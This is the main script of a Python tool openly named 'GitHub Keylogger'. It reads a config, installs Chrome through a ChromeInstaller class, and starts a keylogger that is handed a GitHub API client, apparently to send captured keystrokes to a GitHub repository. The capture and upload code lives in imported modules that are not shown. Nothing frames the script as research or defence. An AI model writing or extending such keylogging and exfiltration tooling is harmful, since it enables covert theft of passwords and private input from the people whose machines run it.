import argparse
from config import Config
from github import Github
from chrome_installer import ChromeInstaller
from keylogger import Keylogger

def parse_args():
    parser = argparse.ArgumentParser(description='GitHub Keylogger')
    parser.add_argument('-c', '--config-path', required=False, default='../config.json', help='Output File Path')
    return parser.parse_args()

def main():
    args = parse_args()
    config = Config(args.config_path)
    keylogger = Keylogger(config.keylogger)
    github_api = Github(config.gh)
    chrome_installer = ChromeInstaller()
    chrome_installer.install_chrome()
    keylogger.start(github_api)

if __name__ == '__main__':
    main()
